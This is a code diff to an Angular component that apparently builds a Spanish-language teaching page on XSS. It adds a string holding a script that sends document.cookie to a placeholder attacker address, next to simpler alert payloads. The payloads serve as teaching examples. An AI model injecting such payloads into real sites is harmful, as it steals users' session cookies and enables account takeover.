@@ -19,6 +19,13 @@ export class XssComponent implements AfterViewInit, OnInit  {
   panelXSSHeader: string = 'Que es XSS';
   codeContentAlert:  string = `Test XSS <script>alert("PruebaXSS");</script>`;
   codeContentAlertCookie:  string = `<script>alert(document.cookie);</script>`;
+  codesendCookie:  string = `
+  <script>
+    var request = new XMLHttpRequest();
+    request.open('GET', 'http://<TU_IP>:<PUERTO>/?cookie=' + document.cookie);
+    request.send();
+  </script>`;
+  
   codeContent: string = `if(test){
     // código
   } else {
